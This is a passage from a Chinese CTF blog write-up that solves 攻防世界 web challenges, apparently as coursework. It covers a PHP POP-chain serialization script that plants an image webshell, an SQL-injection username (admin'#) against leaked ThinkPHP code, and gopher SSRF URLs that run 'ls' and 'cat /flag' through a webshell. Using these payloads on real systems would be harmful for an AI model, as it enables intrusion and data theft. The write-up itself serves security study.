<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/popchain.png"></p>
<p>下面用Antsword生成shell：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/19f3ffd25a8114acc55d7a689541c39a.png">将代码附于一张正常图片之后，上传图片马，右键图片查看路径：<code>…upload/bc3f8b539fdf9334d29684c320f7f0d5/d10c88f869301b1238f53cfdff8e9d7c.png</code>然后运行之前使用POP链构造的脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Register();  </span><br><span class="line"><span class="variable">$a</span>-&gt;registed=<span class="number">0</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;checker=<span class="keyword">new</span> Profile();  </span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;except=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);  </span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;ext=<span class="number">1</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;filename_tmp=<span class="string">&quot;./upload/bc3f8b539fdf9334d29684c320f7f0d5/d10c88f869301b1238f53cfdff8e9d7c.png&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;filename=<span class="string">&quot;./upload/1.php&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>得到新的cookie，使用Cookie Editor修改当前cookie：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/027be2522cc4a888a92a695255c70ee8.png"></p>
<p>刷新一下，然后访问<code>…/upload/</code>，可以发现1.php已经出现在了upload页面里。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1a22b46f30367e0dbad5d3eab9d0cba5.png"></p>
<p>进入后shell脚本已经开始工作了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/af75696ed0aea235eb19fe660e1e8726.png">连接Antsword进入根目录即可获得flag。</p>
<h2 id="Background-Management-System-（难度：8-10）"><a href="#Background-Management-System-（难度：8-10）" class="headerlink" title="Background_Management_System （难度：8/10）"></a>Background_Management_System （难度：8/10）</h2><p>首先使用dirsearch扫描一下，发现疑似有源码泄露：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/f5e108b52ea8b6721d9d4ad6bb9e61ba.png"></p>
<p>打开后可以发现网站是基于<code>ThinkPHP</code>框架开发的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/856f51de27d6ca92f8876dd30875b28f.png">下面进行代码审计。首先来看Register.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;  </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;  </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;  </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Validate</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Userinfo</span> <span class="keyword">extends</span> <span class="title">Controller</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user</span>(<span class="params">Request <span class="variable">$request</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$session </span>= <span class="variable">$request</span>-&gt;session(<span class="string">&#x27;username&#x27;</span>);  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$session </span>=== <span class="string">&#x27;admin&#x27;</span>)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">return</span> view(<span class="string">&#x27;user&#x27;</span>,[<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&#x27;welcome admin!!&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="string">&#x27;This is your hint:   &lt;br&gt;hint&#123;xxxxxxxxxx&#125;&#x27;</span>]);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">return</span> view(<span class="string">&#x27;user&#x27;</span>,[<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&quot;hello <span class="subst">&#123;$session&#125;</span>&quot;</span>,<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="string">&#x27;This is your hint:   &lt;br&gt;flag&#123;&#125;&lt;br&gt;maybe the admin have some hints:)&#x27;</span>]);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> view();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">changeinfo</span>(<span class="params">Request <span class="variable">$request</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$dbuser </span>=<span class="string">&#x27;*****&#x27;</span>;  </span><br><span class="line">        <span class="variable">$dbpass </span>=<span class="string">&#x27;*****&#x27;</span>;  </span><br><span class="line">        <span class="variable">$dbname </span>=<span class="string">&quot;study&quot;</span>;  </span><br><span class="line">        <span class="variable">$host </span>= <span class="string">&#x27;localhost&#x27;</span>;  </span><br><span class="line">        @error_reporting(<span class="number">0</span>);  </span><br><span class="line">        @<span class="variable">$con </span>= mysqli_connect(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>,<span class="variable">$con</span>);  </span><br><span class="line">        <span class="comment">// Check connection  </span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Failed to connect to MySQL: &quot;</span> . mysqli_error();  </span><br><span class="line">        &#125;  </span><br><span class="line">        @mysqli_select_db(<span class="variable">$con</span>,<span class="variable">$dbname</span>) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">&quot;Unable to connect to the database: <span class="subst">$dbname</span>&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="variable">$post </span>= <span class="variable">$request</span>-&gt;post();  </span><br><span class="line">        <span class="variable">$username </span>= <span class="variable">$request</span>-&gt;session(<span class="string">&#x27;username&#x27;</span>);  </span><br><span class="line">        <span class="variable">$pass </span>= <span class="variable">$post</span>[<span class="string">&#x27;password&#x27;</span>];  </span><br><span class="line">        <span class="variable">$curr_pass </span>= <span class="variable">$post</span>[<span class="string">&#x27;current_password&#x27;</span>];  </span><br><span class="line">        <span class="variable">$validate </span>= Validate::make([<span class="string">&#x27;password&#x27;</span>=&gt;<span class="string">&#x27;min:3|confirm&#x27;</span>]);  </span><br><span class="line">        <span class="variable">$status </span>= <span class="variable">$validate</span>-&gt;check(<span class="variable">$post</span>);  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$status</span>)&#123;  </span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&quot;/select|update|delete|insert|into|set|;|between|regexp|like|rlike|=|substr|mid|ascii|join|char|order|count|rand|floor|group|extractvalue|updatexml|exp|concat|outfile|\(|\)/i&quot;</span>, <span class="variable">$curr_pass</span>) || preg_match(<span class="string">&quot;/select|update|delete|insert|into|set|;|between|regexp|like|rlike|=|substr|mid|ascii|join|char|order|count|rand|floor|group|extractvalue|updatexml|exp|concat|outfile|\(|\)/i&quot;</span>, <span class="variable">$pass</span>)) &#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;success(<span class="string">&#x27;go out!! hacker&#x27;</span>,<span class="string">&#x27;/xinan/public/index/index/index&#x27;</span>);  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="variable">$sql </span>= <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;  </span><br><span class="line">                <span class="variable">$res </span>= mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);  </span><br><span class="line">                <span class="variable">$row </span>= mysqli_affected_rows();  </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$row </span>= <span class="number">1</span>)&#123;  </span><br><span class="line">                    <span class="keyword">$this</span>-&gt;success(<span class="string">&#x27;修改成功啦&#x27;</span>,<span class="string">&#x27;/xinan/public/index/login/index&#x27;</span>);  </span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;  </span><br><span class="line">                    <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;修改失败，请联系管理员&#x27;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="variable">$validate</span>-&gt;getError());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>注意黄色背景的SQL语句，存在明显的注入漏洞。我们可以设置用户名为<code>admin&#39;#</code> 这样SQL语句变为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>#<span class="string">&#x27; and password=&#x27;</span>$curr_pass<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这样，<code>password=&#39;$curr_pass&#39;</code>语句将无法生效，我们就可以修改密码了。</p>
<p>首先，注册一个用户名为<code>admin&#39;#</code>的账号。因为系统要求密码长度不小于3，设置密码为111，注册成功。</p>
<p>下面登陆成功后，尝试修改密码。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/95380a00f68c50746bb4c77841952905.png"></p>
<p>修改密码为111。尝试登录admin账号：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a4e48262b6cd98a9dcf1acdb6dc5bb7f.png"></p>
<p>登陆成功，得到hint。进入<code>http://111.200.241.244:50267/xinan/public/55ceedfbc97b0a81277a55506c34af36.php</code>，如图所示。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/5eaecebe7ab408090b7570842a038e6c.png"></p>
<p>根据提示，这里应该是要使用SSRF中的Gopher协议。Gopher是Internet.上一个很有名的信息查找系统，它将Internet.上的文件组织成某种索引，很方便用户获取。Gopher协议使得Internet上的所有Gopher客户程序能够与已注册的Gopher服务器对话。使用格式是gopher://URL，在SSRF中经常会使用Gopher来构造GET/POST包攻击应用。</p>
<p>下面我们直接访问本地80端口的shell：</p>
<p><code>http://111.200.241.244:50267/xinan/public/55ceedfbc97b0a81277a55506c34af36.php?url=gopher://127.0.0.1:80/_GET%20/xinan/public/shell.php?CMD=ls</code></p>
<p>但是回显Bad Request错误。查阅资料后发现Gopher协议要对符号进行二次url编码，例如<code>?</code>首先编码为<code>%3F</code>，再次编码为<code>%253F</code>，空格首先编码为<code>+</code>，再次编码为<code>%2B</code>。</p>
<p>因此首先输入<code>http://111.200.241.244:50267/xinan/public/55ceedfbc97b0a81277a55506c34af36.php?url=gopher://127.0.0.1:80/_GET%20/xinan/public/shell.php%253Fcmd=ls</code>，显示如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/952513946e7c57c998a9f2826a05df63.png"></p>
<p>不在当前目录，大概率在父目录。直接<code>cat /flag</code>即可。Payload：</p>
<p><code>http://111.200.241.244:50267/xinan/public/55ceedfbc97b0a81277a55506c34af36.php?url=gopher://127.0.0.1:80/_GET%20/xinan/public/shell.php%253Fcmd=cat%2B/flag</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/6c65e6ffed2f490e17cd85bbbecd6982.png"></p>
<h2 id="感想与小结"><a href="#感想与小结" class="headerlink" title="感想与小结"></a>感想与小结</h2><hr>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Capcomin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zxy.link/posts/16b653c4/">https://zxy.link/posts/16b653c4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zxy.link" target="_blank">Capcomin's Space</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/">课程作业</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a></div><div class="post_share"><div class="social-share" data-image="/img/cyberlock.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/4a17b156/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/star.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Hello World</div></div></a></div><div class="next-post pull-right"><a href="/posts/7b9d3851/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/rabincover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Rabin加密体制原理概述</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/7eaecac2/" title="攻防世界Web题目WP（一）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/BEC1AFA5887CA3CF9B67BAAD53F20251.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-15</div><div class="title">攻防世界Web题目WP（一）</div></div></a></div><div><a href="/posts/dae2f53a/" title="CUMTCTF-2021秋季赛部分题解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/ctf_coding-1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-07</div><div class="title">CUMTCTF-2021秋季赛部分题解</div></div></a></div><div><a href="/posts/6ced4cb0/" title="LFSRXOR题解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/5f3f3d10b054e.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-07</div><div class="title">LFSRXOR题解</div></div></a></div><div><a href="/posts/8aab642a/" title="Python实现动态验证码(包含GUI)"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Feature-Image-Python-Frameworks-1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-08</div><div class="title">Python实现动态验证码(包含GUI)</div></div></a></div><div><a href="/posts/2f9013ea/" title="Java语言及网络编程作业"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/java.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-20</div><div class="title">Java语言及网络编程作业</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://avatars.githubusercontent.com/u/75996100?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Capcomin</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/capcomin"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/capcomin" target="_blank" title="Github"><i class="fab fa-github-alt"></i></a><a class="social-icon" href="mailto:zxy6538@cumt.edu.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=1172201743" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#easylaravel-%EF%BC%88%E9%9A%BE%E5%BA%A6%EF%BC%9A10-10%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">easylaravel （难度：10&#x2F;10）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nizhuansiwei-%EF%BC%88%E9%9A%BE%E5%BA%A6%EF%BC%9A7-10%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">nizhuansiwei （难度：7&#x2F;10）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-%EF%BC%88%E9%9A%BE%E5%BA%A6%EF%BC%9A10-10%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">Guess （难度：10&#x2F;10）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unagi-%EF%BC%88%E9%9A%BE%E5%BA%A6%EF%BC%9A8-10%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">unagi （难度：8&#x2F;10）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload3-%EF%BC%88%E9%9A%BE%E5%BA%A6%EF%BC%9A10-10%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">upload3 （难度：10&#x2F;10）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Background-Management-System-%EF%BC%88%E9%9A%BE%E5%BA%A6%EF%BC%9A8-10%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">Background_Management_System （难度：8&#x2F;10）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%84%9F%E6%83%B3%E4%B8%8E%E5%B0%8F%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">感想与小结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/4a17b156/" title="Hello World"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/star.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/posts/4a17b156/" title="Hello World">Hello World</a><time datetime="2022-01-19T11:36:00.000Z" title="发表于 2022-01-19 19:36:00">2022-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/16b653c4/" title="攻防世界Web题目WP（二）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cyberlock.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="攻防世界Web题目WP（二）"/></a><div class="content"><a class="title" href="/posts/16b653c4/" title="攻防世界Web题目WP（二）">攻防世界Web题目WP（二）</a><time datetime="2022-01-02T16:00:00.000Z" title="发表于 2022-01-03 00:00:00">2022-01-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/7b9d3851/" title="Rabin加密体制原理概述"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/rabincover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Rabin加密体制原理概述"/></a><div class="content"><a class="title" href="/posts/7b9d3851/" title="Rabin加密体制原理概述">Rabin加密体制原理概述</a><time datetime="2021-12-29T09:25:01.000Z" title="发表于 2021-12-29 17:25:01">2021-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/8aab642a/" title="Python实现动态验证码(包含GUI)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Feature-Image-Python-Frameworks-1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python实现动态验证码(包含GUI)"/></a><div class="content"><a class="title" href="/posts/8aab642a/" title="Python实现动态验证码(包含GUI)">Python实现动态验证码(包含GUI)</a><time datetime="2021-12-07T16:00:00.000Z" title="发表于 2021-12-08 00:00:00">2021-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/6ced4cb0/" title="LFSRXOR题解"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/5f3f3d10b054e.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LFSRXOR题解"/></a><div class="content"><a class="title" href="/posts/6ced4cb0/" title="LFSRXOR题解">LFSRXOR题解</a><time datetime="2021-12-07T08:06:49.000Z" title="发表于 2021-12-07 16:06:49">2021-12-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 Capcomin.  All Rights Reserved.</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
